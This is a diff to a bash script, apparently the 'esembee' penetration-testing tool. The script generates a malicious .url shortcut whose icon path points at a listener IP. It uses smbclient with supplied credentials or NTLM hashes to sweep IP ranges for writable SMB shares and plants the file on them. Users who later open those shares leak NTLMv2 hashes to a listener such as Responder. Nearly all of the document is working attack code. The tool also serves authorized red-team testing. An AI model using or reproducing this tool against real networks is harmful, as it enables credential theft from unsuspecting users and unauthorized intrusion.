@@ -1,93 +1,131 @@
 #!/bin/bash
-
-
-
-COLOR_REST="$(tput sgr0)"
-COLOR_GREEN="$(tput setaf 2)"
+RED="\033[0;31m"
+GREEN="\033[0;32m"
+YELLOW="\033[0;33m"
+RESET="\033[0m"
+BOLD="\033[1m"
 ######
 ###Functions of the script listed below
 ######
 #######function for the URL file creation
-function URLfilecreation () {
-echo "Beginning URL file creation"
-if [[ ! -v IP ]];
-then
-echo "-L argument not found."
-echo "Searching for IPs on local system." 
-ifconfig | grep -w inet | awk -F" " '{print $2}'
-echo " Local IPs on current system found.  IPs on current system listed above. Which IP would you like to use?" 
-read IP
-fi
-Filenamecreation
-echo '[InternetShortcut]
-URL=http://google.com
-WorkingDirectory=%username%
-IconFile=\\'$IP'\%USERNAME%.icon
-IconIndex=1' > $urlfile
-}
+unset urlfile
+
 ####
 ###generator###
 #####
-function Generator () {
-echo "URL File Generator selected"
-if [[ ! -v IP ]];
-then
-echo "-L argument not found."
-echo "Searching for IPs on local system." 
-ifconfig | grep -w inet | awk -F" " '{print $2}'
-echo " Local IPs on current system found.  IPs on current system listed above. Which IP would you like to use?" 
-read IP
-fi
-Filenamecreation
-echo '[InternetShortcut]
+# Function for generating a URL file
+function Generator() {
+    echo "-------------------------"
+    echo "| URL File Generator   |"
+    echo "-------------------------"
+
+    # Use 'ip' command to get IP addresses
+    available_ips=($(ip -4 addr show | grep -oP '(?<=inet\s)\d+(\.\d+){3}'))
+
+    PS3="Select the IP you'd like to use or enter 'custom': "
+    options=("${available_ips[@]}" "Custom IP" "Quit")
+    select opt in "${options[@]}"; do
+        case $opt in
+            "Custom IP")
+                read -p "Enter the custom IP address: " IP
+                break
+                ;;
+            "Quit")
+                echo "Exiting..."
+                return
+                ;;
+            *) 
+                if [[ -n $opt ]]; then
+                    IP=$opt
+                    break
+                else
+                    echo "Invalid selection. Please try again."
+                fi
+                ;;
+        esac
+    done
+
+    # Allow user to set a custom filename or use a default
+    read -p "Enter a filename (leave blank for default name @Esembee.URL): " gurlfile
+    if [[ -z $gurlfile ]]; then
+        gurlfile="@Esembee.url"
+    fi
+
+    echo '[InternetShortcut]
 URL=http://google.com
 WorkingDirectory=%username%
-IconFile=\\'$IP'\%USERNAME%.icon
-IconIndex=1' > $urlfile
-echo "file $urlfile created with listener IP $IP"
-exit
+IconFile=\\'"$IP"'\%USERNAME%.icon
+IconIndex=1' > "$gurlfile"
+    urlfile="$gurlfile"
+    echo -e "-------------------------"
+    echo -e "| ${GREEN}File Created${RESET}           |"
+    echo -e "-------------------------"
+    echo -e "\n"
+    echo "File $urlfile created with listener IP $IP"
 }
+
+
 ######
-###Function for File name creation
-#######
-#######
-function Filenamecreation () {
-echo "Please specify the name for the file. It must begin with an @ and end with the .url extension"
-read urlfile
-echo "$urlfile selected"
-}
-######
-###Function for selction for Fileremoval
-#######
-#######
-function FileRemovalSelection () {
-echo "Locating File for removal"
-ls *.url
-echo "Found url file(s)"
-echo "would you like to remove one of these? [y or n]"
-read URLFileconfirmation
-if [ $URLFileconfirmation == y ]
-then
-	urlfilearray=( $(ls *.url) )
-	echo "please select a file"
-	select urlfile in "${urlfilearray[@]}"
-	do
-	echo "you selected $urlfile"
-	break
-	done
-fi
-}
 ##################Function for URL file selection
-function FileSelection () {
-echo "Searching PWD for URL file"
-	urlfilearray=( $(ls *.url) )
-	echo "please select a file"
-	select urlfile in "${urlfilearray[@]}"
-	do
-	echo "you selected $urlfile"
-	break
-	done
+function FileSelection() {
+    echo "-------------------------"
+    echo "| URL File Selection   |"
+    echo "-------------------------"
+
+    urlfilearray=( *.url )
+
+    if [ ${#urlfilearray[@]} -eq 0 ]; then
+        echo "No URL files found."
+    else
+        echo "Found the following URL files:"
+        PS3="Select a file or option: "
+        select option in "${urlfilearray[@]}" "File Not Found--Select a different Name" "Quit"; do
+            case $option in
+                "Quit")
+                 
+                    echo "Exiting..."
+                    exit
+                    ;;
+                "File Not Found--Select a different Name")
+                
+                    read -p "Enter a custom filename: " urlfile
+                    echo -e "\n\n"
+                    break
+                    ;;
+                *)
+                    urlfileS=$option
+                    
+                    echo "Selected $urlfileS"
+                    break
+                    ;;
+            esac
+        done
+    fi
 }
+
+# Function to display ASCII art spelling "ESEMBEE"
+function display_ascii_art() {
+echo "
+EEEEEEEEEEEEEEEEEEEEEE   SSSSSSSSSSSSSSS EEEEEEEEEEEEEEEEEEEEEEMMMMMMMM               MMMMMMMMBBBBBBBBBBBBBBBBB   EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE
+E::::::::::::::::::::E SS:::::::::::::::SE::::::::::::::::::::EM:::::::M             M:::::::MB::::::::::::::::B  E::::::::::::::::::::EE::::::::::::::::::::E
+E::::::::::::::::::::ES:::::SSSSSS::::::SE::::::::::::::::::::EM::::::::M           M::::::::MB::::::BBBBBB:::::B E::::::::::::::::::::EE::::::::::::::::::::E
+EE::::::EEEEEEEEE::::ES:::::S     SSSSSSSEE::::::EEEEEEEEE::::EM:::::::::M         M:::::::::MBB:::::B     B:::::BEE::::::EEEEEEEEE::::EEE::::::EEEEEEEEE::::E
+  E:::::E       EEEEEES:::::S              E:::::E       EEEEEEM::::::::::M       M::::::::::M  B::::B     B:::::B  E:::::E       EEEEEE  E:::::E       EEEEEE
+  E:::::E             S:::::S              E:::::E             M:::::::::::M     M:::::::::::M  B::::B     B:::::B  E:::::E               E:::::E             
+  E::::::EEEEEEEEEE    S::::SSSS           E::::::EEEEEEEEEE   M:::::::M::::M   M::::M:::::::M  B::::BBBBBB:::::B   E::::::EEEEEEEEEE     E::::::EEEEEEEEEE   
+  E:::::::::::::::E     SS::::::SSSSS      E:::::::::::::::E   M::::::M M::::M M::::M M::::::M  B:::::::::::::BB    E:::::::::::::::E     E:::::::::::::::E   
+  E:::::::::::::::E       SSS::::::::SS    E:::::::::::::::E   M::::::M  M::::M::::M  M::::::M  B::::BBBBBB:::::B   E:::::::::::::::E     E:::::::::::::::E   
+  E::::::EEEEEEEEEE          SSSSSS::::S   E::::::EEEEEEEEEE   M::::::M   M:::::::M   M::::::M  B::::B     B:::::B  E::::::EEEEEEEEEE     E::::::EEEEEEEEEE   
+  E:::::E                         S:::::S  E:::::E             M::::::M    M:::::M    M::::::M  B::::B     B:::::B  E:::::E               E:::::E             
+  E:::::E       EEEEEE            S:::::S  E:::::E       EEEEEEM::::::M     MMMMM     M::::::M  B::::B     B:::::B  E:::::E       EEEEEE  E:::::E       EEEEEE
+EE::::::EEEEEEEE:::::ESSSSSSS     S:::::SEE::::::EEEEEEEE:::::EM::::::M               M::::::MBB:::::BBBBBB::::::BEE::::::EEEEEEEE:::::EEE::::::EEEEEEEE:::::E
+E::::::::::::::::::::ES::::::SSSSSS:::::SE::::::::::::::::::::EM::::::M               M::::::MB:::::::::::::::::B E::::::::::::::::::::EE::::::::::::::::::::E
+E::::::::::::::::::::ES:::::::::::::::SS E::::::::::::::::::::EM::::::M               M::::::MB::::::::::::::::B  E::::::::::::::::::::EE::::::::::::::::::::E
+EEEEEEEEEEEEEEEEEEEEEE SSSSSSSSSSSSSSS   EEEEEEEEEEEEEEEEEEEEEEMMMMMMMM               MMMMMMMMBBBBBBBBBBBBBBBBB   EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE
+"
+}
+
+# Call the function to display ASCII art
 
 
 ######function for the file placement
@@ -108,12 +146,14 @@ Lines=$(cat $allips)
 for Line in $Lines
 do
    echo "Testing SMB connection to "$Line""
-   readarray -t lines < <(smbclient -L "$Line" -U "$u" --password="$p" $h  | grep "Disk" | awk -F" " '{print $1}') 
+   echo -e "\n\n"
+   readarray -t lines < <(smbclient -L "$Line" -U "$u"%"$p" $h  | grep "Disk" | awk -F" " '{print $1}') 
    	for line in "${lines[@]}"; do
-        if smbclient \\\\"$Line"\\"$line" -U $u --password="$p" $h -c "put $urlfile" >/dev/null 2>&1
+        if smbclient \\\\"$Line"\\"$line" -U $u%$p $h -c "put $urlfile" >/dev/null 2>/dev/null
    	then 
-   	printf '%s%s%s\n' $COLOR_GREEN "$u has write access to $line at $Line" $COLOR_REST
-   	printf '%s%s%s\n' $COLOR_GREEN "File $urlfile placed on $Line at share $line" $COLOR_REST
+   	echo -e "${BOLD}${GREEN}$u has WRITE permissions for $line at $Line ${RESET}" 
+   	echo -e "\n\n"
+   	echo -e "${BOLD}${GREEN}File $urlfile placed on $Line at share $line ${RESET}" 
    	fi
    	done
 done
@@ -129,11 +169,15 @@ echo "Target Share not set. -I option requires a specific share to be targeted. 
 exit
 fi
 echo "Testing connection to $targetip"
-smbclient \\\\"$targetip"\\"$share" -U $u --password="$p" $h -c "put $urlfile" >/dev/null 2>&1
+echo -e "\n\n"
+smbclient \\\\"$targetip"\\"$share" -U $u%$p $h -c "put $urlfile" 
+echo -e "\n\n"
+echo "Listing $share at $targetip to confirm placement"
+echo -e "\n\n"
+smbclient \\\\"$targetip"\\"$share" -U $u%$p $h -c "ls" 
 fi
 }
-###########Function for Scope check###
-################
+
 ###########
 #######Function for the cleanup option
 function URLfileremoval () {
@@ -158,12 +202,13 @@ Lines=$(cat $allips)
 for Line in $Lines
 do
    echo "Testing SMB connection to "$Line""
-   readarray -t lines < <(smbclient -L "$Line" -U "$u" --password="$p" $h  | grep "Disk" | awk -F" " '{print $1}') 
+   readarray -t lines < <(smbclient -L "$Line" -U "$u"%"$p" $h  | grep "Disk" | awk -F" " '{print $1}') 
    	for line in "${lines[@]}"; do
-        if smbclient \\\\"$Line"\\"$line" -U $u --password="$p" $h -c "rm $urlfile" >/dev/null 2>&1
+        if smbclient \\\\"$Line"\\"$line" -U $u%$p $h -c "rm $urlfile" >/dev/null 2>/dev/null
    	then 
-   	printf '%s%s%s\n' $COLOR_GREEN "$u has write access to $line at $Line" $COLOR_REST
-   	echo "File $urlfile removed on $Line at share $line" 
+   	echo -e "\n\n"
+   	echo -e "${BOLD}${GREEN}$u has WRITE permissions for $line at $Line ${RESET}" 
+   	echo -e "${BOLD}${GREEN}File $urlfile REMOVED on $Line at share $line ${RESET}" 
    	fi
    	done
 done
@@ -179,12 +224,16 @@ echo "Target Share not set. Set with -S argument."
 exit
 fi
 echo "Testing connection to $targetip"
-smbclient \\\\"$targetip"\\"$share" -U $u --password="$p" $h -c "rm $urlfile" >/dev/null 2>&1
+smbclient \\\\"$targetip"\\"$share" -U $u%$p $h -c "rm $urlfile" 
+echo -e "\n\n"
+echo "Listing $share at $targetip to confirm removal"
+echo -e "\n\n"
+smbclient \\\\"$targetip"\\"$share" -U $u%$p $h -c "ls" 
 fi
 exit
 }
 ########################
-#######Function for Test write access####
+#######Function for Test WRITE access####
 function Testconnection () {
 if [[ -v allips ]];
 then
@@ -203,11 +252,12 @@ for Line in $Lines
 do
    touch testfile.txt
    echo "Testing SMB connection to "$Line""
-   readarray -t lines < <(smbclient -L "$Line" -U "$u" --password="$p" $h  | grep "Disk" | awk -F" " '{print $1}') 
+   readarray -t lines < <(smbclient -L "$Line" -U "$u"%"$p" $h  | grep "Disk" | awk -F" " '{print $1}') 
    	for line in "${lines[@]}"; do
-   	if smbclient \\\\"$Line"\\"$line" -U $u --password="$p" $h -c "put testfile.txt ; rm testfile.txt" >/dev/null 2>&1 
+   	if smbclient \\\\"$Line"\\"$line" -U $u%$p $h -c "put testfile.txt ; rm testfile.txt" >/dev/null 2>/dev/null 
    	then 
-   	printf '%s%s%s\n' $COLOR_GREEN "$u has write access to $line at $Line" $COLOR_REST
+   	echo -e "\n\n"
+   	echo -e "${BOLD}${GREEN} $u has WRITE permissions for $line at $Line ${RESET}" 
    	fi
    	done
 done
@@ -224,11 +274,11 @@ exit
 fi
 touch testfile.txt
 echo "Testing connection to $targetip"
-if smbclient \\\\"$targetip"\\"$share" -U $u --password="$p" $h -c "put testfile.txt ; rm testfile.txt" >/dev/null 2>&1
+if smbclient \\\\"$targetip"\\"$share" -U $u%$p $h -c "put testfile.txt ; rm testfile.txt" >/dev/null 2>/dev/null
 then
-printf '%s%s%s\n' $COLOR_GREEN "$u has write access to $line at $Line" $COLOR_REST
+echo "$u has WRITE access to $share at $targetip."
 else
-echo "$u cannot write to $share at $targetip." 
+echo "$u cannot WRITE to $share at $targetip." 
 fi
 fi
 rm testfile.txt
@@ -241,19 +291,19 @@ exit
 function variablecheck () {
 if [[ ! -v u ]];
 then
-echo "Username not set. Use -u to set username. if Null, set -u as 'Null' Exiting..."
+echo "Username not set. Use -u to set username. Exiting..."
 exit
 fi
 if [[ ! -v p ]];
 then
-echo "password not set. Use -p to set password. if Null session, set -p as '-N' Exiting..."
+echo "password not set. Use -p to set password. Exiting..."
 exit
 fi
 }
 ############HELPMENU########
 function helpmenu () {
    # Display Help
-   echo "This script can generate a a malicious URL file containing the IP of a listener, scan a scope of IPs for write access, and place the URL file on writable shares. When the share is accessed by a victim, their NTLMv2 hash can be captured via a listener like Responder." 
+   echo "This script can generate a a malicious URL file containing the IP of a listener, scan a scope of IPs for WRITE access, and place the URL file on writable shares. When the share is accessed by a victim, their NTLMv2 hash can be captured via a listener like Responder." 
    echo
    echo "To specify a target: Either a list of IPs can be supplied with the -f option or a specific target IP can be supplied with -I along with a specific share -S, ie ./esembee.sh -I <target IP> -S <target share> or ./esembee.sh -f <scopeips.txt>"
    echo
@@ -261,20 +311,18 @@ function helpmenu () {
    echo
    echo "Syntax to run cleanup on a specific share: ./esembee.sh -u <domain/username> -p <password> -I <192.168.8.8> -S <sharename> -C -F <urlfile>"
    echo
-   echo "Syntax to scan scope of IPs for write access: ./esembee.sh -u <domain/username> -p <password> -f <scopeIPs.txt> -t"
-   echo
-   echo "Syntax to run a NULL scan ./esembee.sh -u 'null' -p '-N' -f <scopeIPs.txt> -t"
+   echo "Syntax to scan scope of IPs for WRITE access: ./esembee.sh -u <domain/username> -p <password> -f <scopeIPs.txt> -t"
    echo
    echo "options:"
-   echo "-u     This argument is required. Supply the domain/username; set argument as null if null"
-   echo "-p     This argument is required. Supply the password or hash of the domain user. set argument as -N if null"
+   echo "-u     This argument is required. Supply the domain/username"
+   echo "-p     This argument is required. Supply the password or hash of the domain user"
    echo "-H     Optional argument to use when the supplied password is an NTLM hash"
    echo "-I     Optional target specification for a single IP. Must also specify the share with the -S argument"
    echo "-S     Optional target specification to be used in conjunction with the -I argument"
    echo "-f     Optional target specification. Supply a txt file of possible target IPs"
    echo "-C     Optional argument to run the clean up utility to remove the URL file."
    echo "-F     Optional argument if you already have a URL file created. If not specified the tool will assist with generating a URL file."
-   echo "-t     Optional argument to test for write access against against a target."
+   echo "-t     Optional argument to test for WRITE access against against a target."
    echo "-L     Optional argument to set the IP for the listener in the URL file and bypass the user input during URL file creation process"
    echo "-G     Optional argument to just run the URL File Generator."
 exit
@@ -300,8 +348,13 @@ while getopts t,u:p:f:H,h,C,F:I:S:L:G options; do
 done
 ################### SCRIPT ACTIONS  ####################################
 $Help
-$Generate
+display_ascii_art
+if [[ -n $Generate ]]; then
+    $Generate  # Call the assigned function
+    exit  # Exit after the desired actions are completed
+fi
 variablecheck
+
 $t
 $cleanup
 if [[ -v urlfile ]];
@@ -311,7 +364,7 @@ else
 echo "No URL file set. Do you need a URL file created? [y or n]"
 read Filecreationneeded
 if [ $Filecreationneeded == y ]
-then "URLfilecreation"
+then "Generator"
 "URLfileplacement"
 else 
 "FileSelection"
